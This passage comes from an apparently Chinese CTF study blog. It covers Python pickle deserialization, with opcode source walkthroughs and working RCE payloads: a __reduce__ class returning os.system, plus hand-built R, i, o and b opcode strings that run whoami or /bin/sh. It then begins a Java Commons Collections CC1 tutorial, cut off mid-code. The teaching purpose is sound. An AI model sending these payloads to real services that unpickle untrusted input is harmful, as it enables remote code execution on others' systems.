stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>load_setitem(self)</code>对应<code>&#39;s&#39;</code></p><ol><li>再栈中获取顶上两个作为值键并添加到最后栈顶的的dict中，其实算是修改栈顶了</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    value = stack.pop()</span><br><span class="line">    key = stack.pop()</span><br><span class="line">    <span class="built_in">dict</span> = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">dict</span>[key] = value</span><br><span class="line">dispatch[SETITEM[<span class="number">0</span>]] = load_setitem</span><br></pre></td></tr></table></figure></li><li><p><code>load_tuple</code>对应<code>&#39;t&#39;</code></p><ol><li>读取stack中的内容，合成一个tuple后加入到stack中</li><li><code>pop_mark()</code>中会将metastack也给pop()，会得到上一个(存储的stack内容，可以理解为恢复栈 –&gt; 提供了嵌套(的可行性</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_tuple</span>(<span class="params">self</span>):</span><br><span class="line">    items = <span class="variable language_">self</span>.pop_mark()</span><br><span class="line">    <span class="variable language_">self</span>.append(<span class="built_in">tuple</span>(items))</span><br><span class="line">dispatch[TUPLE[<span class="number">0</span>]] = load_tuple</span><br></pre></td></tr></table></figure></li></ol><h2 id="pickle进行简单RCE"><a href="#pickle进行简单RCE" class="headerlink" title="pickle进行简单RCE"></a>pickle进行简单RCE</h2><h3 id="利用-reduce"><a href="#利用-reduce" class="headerlink" title="利用__reduce__"></a>利用<code>__reduce__</code></h3><blockquote><p>看网上别人的文章时发现他错把<code>__reduce__()</code>看作php里的<code>__wakeup()</code>了，这里来好好讲一下流程</p></blockquote><ol><li><p>也是给一个基本payload，在进行序列化pickling时被调用封存数据，并在最后<code>object.load()</code>时触发恶意代码</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure></li><li><p>具体流程</p><ol><li>序列化dump()<ol><li>pickle.dumps(obj) 调用 MyClass 实例的 <code>__reduce__()</code> 方法。</li><li><code>__reduce__()</code> 返回 <code>(self.__class__, (self.value,), self.__dict__)</code>。</li><li>pickle 使用这个元组来生成封存的数据流，这里进行了封装，和直接手写opcode不一样啊</li></ol></li><li>反序列化load()<ol><li>pickle.loads(serialized) 读取封存的数据流。</li><li>pickle 使用封存数据中的信息来重建 MyClass 实例。</li><li>在重建对象后，pickle 调用 <code>__setstate__()</code> 方法，并将 <code>__reduce__()</code> 返回的状态传递给它。</li><li><code>__setstate__()</code> 方法通过 <code>self.__dict__.update(state)</code> 将状态恢复到对象的属性中。</li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # 流程验证 # # #</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># def __reduce__(self):</span></span><br><span class="line">        <span class="comment"># shell = &#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="comment"># return (os.system,(shell,))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># demo = Demo()</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/kc1zs4/Code/CTF/Learned/PyPickle/reducePayload_1.pkl&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># pickle.dump(demo,f,protocol=0)</span></span><br><span class="line">    pickle.load(f)</span><br></pre></td></tr></table></figure></li></ol><h3 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h3><blockquote><p>建议先看完《进阶：pickle源码中的opcode》并了解关键opcode的用法后再来</p></blockquote><ol><li><strong>思想</strong>: 其实也可以将opcode的拼凑作为<strong>调用链</strong>来看，这里其实糅合了很多东西</li></ol><h4 id="pickletools分析方法"><a href="#pickletools分析方法" class="headerlink" title="pickletools分析方法"></a>pickletools分析方法</h4><blockquote><p>多分析几条构造的后面就会自己写了</p></blockquote><ol><li>实例脚本<ol><li>注意换行和空格要严格遵守</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="R操作符"><a href="#R操作符" class="headerlink" title="R操作符"></a>R操作符</h4><blockquote><p>利用条件：无过滤下可输入即可利用</p></blockquote><ol><li><p>给个模板，一般题目直接这样就好了，详细内容看从例子理解opcode</p><ol><li>就是<code>__import__(&#39;os&#39;).system(*(&#39;whoami&#39;,))</code></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;<span class="built_in">callable</span>&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一般脚本</span></span><br><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;/bin/bash&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></li><li><p>最终payload: <code>&quot;cos\nsystem\n(S&#39;/bin/sh&#39;\ntR.)&quot;</code></p></li><li><p>R的作用</p></li></ol><h4 id="i操作符"><a href="#i操作符" class="headerlink" title="i操作符"></a>i操作符</h4><ol><li>结合上述进阶内容，直接写payload: <code>(X\x06\x00\x00\x00whoamiios\nsystem\n.</code></li><li>这里需要说明一下<ol><li><p>回去看i的源码，可以看到i中有调用到pop_mark()，其实这里不需要t的原因就是因为这里的i调用了pop_mark()，R中的调用也在再i中进行了</p></li><li><p><code>load_binunicode</code>对应<code>&#39;X&#39;</code></p><ol><li>这里其实不用过多看源码，<strong>把它当作S理解就好</strong>，只是要多点格式：要先写出数据的长度，\x05\x00\x00\x00 是字符串”hello”的长度（5个字节）</li></ol>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_binunicode</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">len</span>, = unpack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="variable language_">self</span>.read(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span> &gt; maxsize:</span><br><span class="line">        <span class="keyword">raise</span> UnpicklingError(<span class="string">&quot;BINUNICODE exceeds system&#x27;s maximum size &quot;</span></span><br><span class="line">                              <span class="string">&quot;of %d bytes&quot;</span> % maxsize)</span><br><span class="line">    <span class="variable language_">self</span>.append(<span class="built_in">str</span>(<span class="variable language_">self</span>.read(<span class="built_in">len</span>), <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;surrogatepass&#x27;</span>))</span><br><span class="line">dispatch[BINUNICODE[<span class="number">0</span>]] = load_binunicode</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="o操作符"><a href="#o操作符" class="headerlink" title="o操作符"></a>o操作符</h4><ol><li>也是直接上payload: <code>b&quot;(cos\nsystem\nS&#39;/bin/sh&#39;\no.&quot;</code></li><li>这里的核心也是pop_mark()，再o中会有它的身影，S部分也可以换成X这样</li></ol><h4 id="b操作符"><a href="#b操作符" class="headerlink" title="b操作符"></a>b操作符</h4><h5 id="getstate-和-setstate"><a href="#getstate-和-setstate" class="headerlink" title="__getstate__和__setstate__"></a><code>__getstate__</code>和<code>__setstate__</code></h5><ol><li>Q: state是什么?<ol><li>A: 在 Python 中，对象的状态（state）通常指的是<strong>对象的所有属性及其值</strong>。这些属性可以是实例变量、类变量等</li></ol></li><li><code>object. __getstate__()</code><ol><li>官方文档:  It is called and the returned object is pickled as the contents for the instance, instead of a default state –&gt; 总的来说就是<strong>封装一个对象的属性信息</strong><ol><li>对于具有__slots__但没有实例__dict__的类，默认状态是一个元组，其第一项是None，第二项是一个字典，该字典将插槽名称映射到上一个项目符号中描述的插槽值。</li><li>对于具有实例__dict__和__slots__的类，默认状态是由两个字典组成的元组：<code>self.__dict__</code>，以及一个将插槽名称映射到插槽值的字典。只有具有值的插槽才包括在后者中。</li><li>对于有实例__dict__而没有__slots__的类，默认状态是<code>self.__dict__</code></li><li>对于没有instance__dict__和__slots__的类，默认状态为None</li></ol></li><li><strong>版本信息</strong>: 在3.11版中更改：在object类中添加了<code>__getstate__()</code>方法的默认实现</li></ol></li><li><code>object.__setstate__()</code><ol><li>官方文档 –&gt; 总的来说就是恢复一个对象的属性信息并复原<ol><li>在unpickle时，如果类定义了__setstate__()，它将以unpickle状态被调用。在这种情况下，不需要状态对象是字典。否则，pickle状态必须是一个字典，并且它的项被分配给新实例的字典<code>__dict__</code>；</li><li>如果<code>__reduce__</code>在pickle时返回值为None的状态，则在解pickle时不会调用__setstate__()方法</li></ol></li></ol></li><li><strong>setstate和getstate在pickle中的运用</strong>: 如果你没有为你的类定义这些方法，那么 pickle 模块将使用它自己的默认行为来处理对象的状态<ol><li>如果你没有定义 <code>__setstate__</code> 方法，pickle 会直接更新对象的 <code>__dict__</code> 或 <code>__slots__</code> 中的属性。也就是说，pickle 会根据反序列化得到的数据来恢复对象的状态</li><li>如果你没有定义 <code>__getstate__</code> 方法，pickle 将会尝试序列化整个对象的 <code>__dict__</code>（即所有实例变量）。如果对象使用了 <code>__slots__</code>，那么 pickle 会序列化 <code>__slots__</code> 中定义的所有属性</li></ol></li></ol><h5 id="b-payload"><a href="#b-payload" class="headerlink" title="b_payload"></a>b_payload</h5><ol><li><p>给出payload：<code>b&quot;c__main__\ntest\n)\x81&#125;X\x0c\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&quot;</code>，对着pickleTools进行分析</p><ol><li>这里是利用空的dict来构造setitem里的payload，再将其set到<code>__main__.test</code>实例里面（空构造函数）</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__main__ test&#x27;</span></span><br><span class="line"><span class="number">15</span>: )    EMPTY_TUPLE</span><br><span class="line"><span class="number">16</span>: \x81 NEWOBJ</span><br><span class="line"><span class="number">17</span>: &#125;    EMPTY_DICT</span><br><span class="line"><span class="number">18</span>: X    BINUNICODE <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line"><span class="number">35</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line"><span class="number">46</span>: s    SETITEM</span><br><span class="line"><span class="number">47</span>: b    BUILD</span><br><span class="line"><span class="number">48</span>: X    BINUNICODE <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="number">59</span>: b    BUILD</span><br><span class="line"><span class="number">60</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>补充一些点</p><ol><li><p><code>&#39;)&#39;</code>: <code>EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple</code></p></li><li><p><code>&#39;&#125;&#39;</code>: <code>EMPTY_DICT     = b&#39;&#125;&#39;   # push empty dict</code></p></li><li><p><code>&#39;\x81&#39;</code>：这里会对栈顶的元素pop出来，先args后cls，然后生成一个实例</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_newobj</span>(<span class="params">self</span>):</span><br><span class="line">    args = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    cls = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    obj = cls.__new__(cls, *args)</span><br><span class="line">    <span class="variable language_">self</span>.append(obj)</span><br><span class="line">dispatch[NEWOBJ[<span class="number">0</span>]] = load_newobj</span><br></pre></td></tr></table></figure></li></ol></li><li><p>还是要回到代码去理解，这里最后一个b看了好久，终于懂了，还是要细细思考代码的运作原理</p><ol><li>这里采用的是类似原型链污染的方法，注意到在b中会获取<code>__setstate__</code>这个attr，而这个payload在前面已经自动把test对象的<code>__setstate__</code>赋值为<code>os.system()</code>，这里再加上传入的参数<code>whomai</code>进行了回调<code>setstate(state)</code>其实就是<code>os.system(&quot;whoami&quot;)</code>，注意python函数也是一个对象</li><li>真正的关键点在于到达回调的链子构造</li></ol></li></ol><h2 id="Marshel进行RCE"><a href="#Marshel进行RCE" class="headerlink" title="Marshel进行RCE"></a>Marshel进行RCE</h2><h2 id="PyYAML进行RCE"><a href="#PyYAML进行RCE" class="headerlink" title="PyYAML进行RCE"></a>PyYAML进行RCE</h2><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一文即可，这篇写的也很好</a></li><li><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(3)_CC1_TransformedMap</title>
      <link href="/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/"/>
      <url>/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/</url>
      
        <content type="html"><![CDATA[<h2 id="java反序列化宏观思维"><a href="#java反序列化宏观思维" class="headerlink" title="*java反序列化宏观思维"></a>*java反序列化宏观思维</h2><blockquote><p>开启cc链前，有必要来整理一下一些比较宏观的思维而不是技术细节</p></blockquote><ol><li><em><strong>本源于传输对象</strong></em>：Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输</li><li><em><strong>在与php比较中认识java</strong></em><ol><li>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象</li><li>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在<strong>序列化流中插入一些自定义数据</strong>，进而在反序列化的时候能够使用 readObject 进行读取</li><li><strong>readObject()和__wakeup()的不同:</strong> readObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的问题<ol><li>大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性</li><li>二者的相同之处都是<strong>需要一个Gadget Chain</strong></li></ol></li></ol></li><li><em><strong>什么是时候可以利用</strong></em><ol><li>lib&#x2F;jar包中的类<ol><li>被反序列化的类一般都是 lib&#x2F;jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 readObject() 且存在有效的利用链（普通的开发都是功能型开发，很少用到反序列化）</li><li>由于 Json 的普及使得极少情况下才需要手写序列化的类（结果Jackson和fastjson产生了大量的反序列化漏洞）</li><li>目前曝出来的大部分反序列化利用的都是 lib&#x2F;jar 包中的类，这些类为了通用性就会写出一些特殊的 readObject() 方法，这也导致一些花式攻击手法的产生</li></ol></li><li><strong>通过调用关系形成链式关系，要看透层的关系</strong><ol><li>URLDNS</li><li>接下来的CC1都是这样</li></ol></li></ol></li></ol><h2 id="CC1链前置"><a href="#CC1链前置" class="headerlink" title="CC1链前置"></a>CC1链前置</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="*搭建环境"></a>*搭建环境</h3><ol><li><p>JDK版本应该为8u71之前</p></li><li><p>使用maven搭建，commons-collections3.1</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p>换源使用新建setting.xml，加入<a href="https://developer.aliyun.com/mirror/?serviceType=&tag=&keyword=maven">阿里源</a></p></li><li><p>随后下载common-collections3.1的源码就ok，似乎本来是class文件来着</p></li></ol><h3 id="什么是Commons-Collections"><a href="#什么是Commons-Collections" class="headerlink" title="什么是Commons Collections"></a>什么是Commons Collections</h3><ol><li><p>是一个集合组件，扩展了Java标准Collections API，对常用的集合操作进行了很好的封装、抽象和补充</p><ol><li>作为容器类的补充，我们可以找到Bag、Buffer、BidiMap、OrderedMap等等</li><li>作为操作类的补充，我们可以找到CollectionUtils、IteratorUtils、ListUtils、SetUtils等等</li><li>作为辅助类的补充，我们可以找到MapIterator、Closure、Predicate、Transformer等等；</li></ol></li><li><p>12个包结构</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.bag – 实现Bag接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.buffer – 实现Buffer接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.collection –实现java.util.Collection接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors –Commons Collections自定义的一组功能类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.list – 实现java.util.List接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map – 实现Map系列接口的一组类</span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.set – 实现Set系列接口的一组类</span><br></pre></td></tr></table></figure></li></ol><h3 id="Transformer是什么"><a href="#Transformer是什么" class="headerlink" title="Transformer是什么"></a>Transformer是什么</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote><p>attention is all you need!(大雾，不过确实需要惊人的注意力来找链</p></blockquote><ol><li><p>Transformer 是 Apache Commons Collections 库中的一个重要接口，用于表示一个可以将输入对象转换为另一个对象的转换器</p></li><li><p>个人理解</p><ol><li>可以理解为对象的装饰器，对象调用给定转换器的transform方法，对对象本身进行操作</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     * 这里的转换可能include method invokation, returning a constant, cloning and returning the string value</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><ol><li><p>根据注释，用于装饰一个Map对象，转换它添加的对象，通过<code>decorate()</code>和构造函数可以创建一个TransformedMap对象，进行修饰的修改作用在新的TransformedMap对象身上，这里的TransformedMap是一个装饰器，<strong>会影响到传入的map对象</strong></p><ol><li>支持<code>readObject()</code>和<code>writeObject()</code>两种方法对map进行操作</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The Map put methods and Map.Entry setValue method are affected by this class.</span></span><br><span class="line"><span class="comment"> * Thus objects must be removed or searched for using their transformed form.</span></span><br><span class="line"><span class="comment"> * For example, if the transformation converts Strings to Integers, you must</span></span><br><span class="line"><span class="comment"> * use the Integer form to remove objects.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This class is Serializable from Commons Collections 3.1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.11 $ $Date: 2004/06/07 22:14:42 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>查看它的decorate()和构造函数</p><ol><li><p>是个静态方法，里面调用了类的protected构造器。根据注释就可以理解，decorate()方法的第一个参数就是要修饰的Map对象，第二个和第三个参数都是实现了Transformer接口的类的对象，分别用来转换Map的键和值。为null的话就意味着没有转换。<strong>返回的Map是被修饰后的Map对象</strong>，本身也受到影响</p><ol><li>这里和构造方法也是一样的逻辑</li><li>这里的KeyTransformer和ValueTransformer<strong>需要自己自定义行为</strong>，实现对于接口即可</li></ol></li><li><p>可以知道<code>The Map put methods and Map.Entry setValue method are affected by this class</code>，<strong>使用put还有setValue方法的时候</strong>，会调用相应的Transformer的transform()方法进行响应的转换</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 